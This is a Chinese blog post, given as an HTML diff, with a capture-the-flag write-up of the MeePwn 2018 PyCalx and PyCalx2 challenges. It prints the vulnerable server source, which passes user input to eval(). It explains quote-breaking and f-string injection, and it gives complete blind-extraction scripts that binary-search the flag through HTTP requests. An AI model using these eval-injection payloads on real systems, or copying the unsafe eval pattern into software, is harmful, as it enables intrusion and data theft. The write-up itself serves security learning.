@@ -1,0 +1,1169 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="本文首发 先知社区 ，转载请注明链接。  PyCalx This code is supposed to be unexploitable :/ another pyjail?[Source]Try this or thisNotice: The flag may contain non alphabetic characters (but still printable)  本题由Python的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Meepwn2018：PyCalx&amp;PyCalx2——Python3的f-string与eval注入">
+<meta property="og:url" content="https://findneo.github.io/180719MeePwn_py3Inject/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="本文首发 先知社区 ，转载请注明链接。  PyCalx This code is supposed to be unexploitable :/ another pyjail?[Source]Try this or thisNotice: The flag may contain non alphabetic characters (but still printable)  本题由Python的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://findneo.github.io/180719MeePwn_py3Inject/1531905259492.png">
+<meta property="og:image" content="https://findneo.github.io/180719MeePwn_py3Inject/1531905207979.png">
+<meta property="og:updated_time" content="2019-01-25T23:21:37.026Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Meepwn2018：PyCalx&amp;PyCalx2——Python3的f-string与eval注入">
+<meta name="twitter:description" content="本文首发 先知社区 ，转载请注明链接。  PyCalx This code is supposed to be unexploitable :/ another pyjail?[Source]Try this or thisNotice: The flag may contain non alphabetic characters (but still printable)  本题由Python的">
+<meta name="twitter:image" content="https://findneo.github.io/180719MeePwn_py3Inject/1531905259492.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findneo.github.io/180719MeePwn_py3Inject/">
+
+
+
+
+
+  <title>Meepwn2018：PyCalx&PyCalx2——Python3的f-string与eval注入 | 闲言语</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">闲言语</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180719MeePwn_py3Inject/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Meepwn2018：PyCalx&PyCalx2——Python3的f-string与eval注入</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-19T09:10:50+08:00">
+                2018-07-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>本文首发 <a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">先知社区</a> ，转载请注明链接。</strong> </p>
+<h1 id="PyCalx"><a href="#PyCalx" class="headerlink" title="PyCalx"></a>PyCalx</h1><blockquote>
+<p>This code is supposed to be unexploitable :/ another pyjail?<br><a href="http://178.128.96.203/cgi-bin/server.py?source=1" target="_blank" rel="noopener">[Source]</a><br><a href="http://178.128.96.203/cgi-bin/server.py?value1=123&amp;op=%3D%3D&amp;value2=123" target="_blank" rel="noopener">Try this </a>or <a href="http://178.128.96.203/cgi-bin/server.py?value1=abc&amp;op=%3D%3D&amp;value2=abc" target="_blank" rel="noopener">this</a><br>Notice: The flag may contain non alphabetic characters (but still printable)</p>
+</blockquote>
+<p>本题由Python的 <code>eval()</code> 函数参数可控且直接拼接引发的注入，采用二分法盲注。</p>
+<p>server.py源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = open(<span class="string">'/var/www/flag'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">OK_200 = <span class="string">"some HTML code"</span></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'source'</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">'source'</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">'1'</span>:</span><br><span class="line">    print(<span class="string">'&lt;pre&gt;'</span> + escape(str(open(__file__, <span class="string">'r'</span>).read())) + <span class="string">'&lt;/pre&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'value1'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'value2'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'op'</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> str(val).isdigit(): <span class="keyword">return</span> int(val)</span><br><span class="line">        blacklist = [<span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'\''</span>,</span><br><span class="line">                     <span class="string">'"'</span>]  <span class="comment"># I don't like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid value&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'*'</span>, <span class="string">'='</span>, <span class="string">'!'</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid op&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">'op'</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">'value1'</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">'value2'</span>].value)</span><br><span class="line">    <span class="keyword">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(<span class="string">'&lt;center&gt;Types of the values don\'t match&lt;/center&gt;'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">'&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class="col-md-8"&gt;&lt;pre&gt;'</span></span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt;&gt; print('</span> + escape(calc_eval) + <span class="string">')'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">'True'</span> <span class="keyword">or</span> result == <span class="string">'False'</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(</span><br><span class="line">                <span class="string">"Invalid"</span></span><br><span class="line">            )  <span class="comment"># Sorry we don't support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Invalid"</span>)</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;'</span>)</span><br></pre></td></tr></table></figure>
+<p>大意如下：</p>
+<ul>
+<li>cgi会处理source，value1，value2，op四个参数。</li>
+<li>如果source=1则打印源代码。</li>
+<li>value1，value2，op三个参数都有值时进一步处理。<ul>
+<li>value1，value2至少1个字符，至多64个，且不包含黑名单<code>()[]&#39;&quot;</code> 里的字符。</li>
+<li>op至少1个字符，至多2个，且首字符必须在白名单<code>+-*/=!</code> 里。</li>
+<li>value1,value2要么都是只包含<code>[0-9]</code>，要么都包含其他字符。</li>
+<li>执行<code>str(eval(str(repr(value1)) + str(op) + str(repr(value2))))</code> ，且只有结果是bool值或只包含<code>[0-9]</code> 时才会输出。<ul>
+<li>注：repr返回对象的可打印形式，和反引号包裹效果一致，对大多数类型，他会返有一个字符串，使其可以作为代码直接传入eval执行。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>解题思路：<code>op</code> 允许两个字符，且第二个字符是任意的，那么如果是一个单引号，就能混淆代码和数据，起到类似SQL注入的效果。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(repr(<span class="string">"a"</span>))+str(<span class="string">"+"</span>)+str(repr(<span class="string">"b"</span>)))</span><br><span class="line"><span class="string">'a'</span>+<span class="string">'b'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(str(repr(<span class="string">"a"</span>))+str(<span class="string">"+'"</span>)+str(repr(<span class="string">"&lt; b#"</span>)))</span><br><span class="line"><span class="string">'a'</span>+<span class="string">''</span>&lt; b<span class="comment">#'</span></span><br></pre></td></tr></table></figure>
+<p>解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://178.128.96.203/cgi-bin/server.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    <span class="comment"># print payload</span></span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    <span class="comment"># print r.url</span></span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> (res != <span class="string">'Invalid'</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'True'</span></span><br><span class="line">    <span class="comment"># print r.content</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print lo, mid, hi, "\t",</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, v2, op, s = <span class="string">'x'</span>, <span class="string">"+FLAG&lt;value1+source#"</span>, <span class="string">"+'"</span>, <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.66666666666666_([_((you_passed_this?]]]]]])&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="1531905259492.png" alt="1531905259492"></p>
+<h1 id="PyCalx2"><a href="#PyCalx2" class="headerlink" title="PyCalx2"></a>PyCalx2</h1><blockquote>
+<p>You should solve <code>PyCalx</code> first. </p>
+<p><a href="http://206.189.223.3/cgi-bin/server.py?source=1" target="_blank" rel="noopener">http://206.189.223.3/cgi-bin/server.py?source=1</a>  </p>
+</blockquote>
+<p><code>server.py</code> 只改动了一行代码，将<code>op = get_op(arguments[&#39;op&#39;].value)</code> 变成了 <code>op = get_op(get_value(arguments[&#39;op&#39;].value))</code>  ，也就是说将<code>op</code> 参数也进行了黑名单过滤，于是 <code>op</code> 的第二个字符就不能是单引号，第一题的方法也就失效了。</p>
+<p>结合题目提示和第一题的flag去寻找Python3.6的新特性，用到了这个 <code>f-string</code> ，详见<a href="https://www.python.org/dev/peps/pep-0498/" target="_blank" rel="noopener">PEP 498 – Literal String Interpolation</a> 。简言之就是可以在字符串中方便地直接插入表达式，以<code>f</code> 开头，表达式插在大括号<code>{}</code> 里，在运行时表达式会被计算并替换成对应的值。</p>
+<p>本题主要是利用这个特性在字符串里插入比较的表达式，剩下的就和上题一样了。插法不尽相同，CTF Time上的WP里有这么两种，相信还可以有其他的方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;FLAG&lt;source or 14:x&#125;'</span>)) <span class="comment"># 14的十六进制表示时'e'</span></span><br><span class="line"><span class="string">"'T'+f'ru&#123;FLAG&lt;source or 14:x&#125;'"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;1 or 14:x&#125;'</span>)))</span><br><span class="line"><span class="string">'Tru1'</span> <span class="comment"># 返回Invalid</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'T'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'ru&#123;0 or 14:x&#125;'</span>)))</span><br><span class="line"><span class="string">'True'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;'</span>))</span><br><span class="line"><span class="string">"'Tru'+f'&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;'"</span></span><br><span class="line"><span class="comment"># &#123;FLAG&lt;source:1&#125;的值相当于printf("%1f",FLAG&lt;source)的结果，有0和1两种可能。</span></span><br><span class="line"><span class="comment">#这边sys.exit.__name__等价于字符串'exit'，考虑到已经import escape，直接用escape.__name__也可。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;1:1&#125;.1&#125;'</span>)))</span><br><span class="line"><span class="string">'True'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(str(repr(<span class="string">'Tru'</span>))+str(<span class="string">'+f'</span>)+str(repr(<span class="string">'&#123;sys.exit.__name__:&#123;0:1&#125;.1&#125;'</span>)))</span><br><span class="line"><span class="comment">#报错，返回Invalid</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"&lt;string&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: <span class="string">'='</span> alignment <span class="keyword">not</span> allowed <span class="keyword">in</span> string format specifier</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+<p>解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(v1, v2, op, s)</span>:</span></span><br><span class="line">    u = <span class="string">"http://206.189.223.3/cgi-bin/server.py?"</span></span><br><span class="line">    payload = dict(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    res = re.findall(<span class="string">"&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;"</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">'Invalid'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(mid)</span>:</span></span><br><span class="line">    s = flag + chr(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span><span class="params">(seq=xrange<span class="params">(<span class="number">0x20</span>, <span class="number">0x80</span>)</span>, lo=<span class="number">0</span>, hi=None)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="keyword">None</span>: hi = len(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">v1, op, v2, s = <span class="string">'T'</span>, <span class="string">"+f"</span>, <span class="string">"ru&#123;FLAG&lt;source or 14:x&#125;"</span>, <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += chr(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.6[_strikes_backkkkkkkkkkkk)&#125;</span></span><br></pre></td></tr></table></figure>
+<p><img src="1531905207979.png" alt="1531905207979"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/180727rsa-attack/" rel="next" title="CTF中常见的RSA相关问题总结">
+                <i class="fa fa-chevron-left"></i> CTF中常见的RSA相关问题总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/180721MeepwnMaplStory/" rel="prev" title="Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含">
+                Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
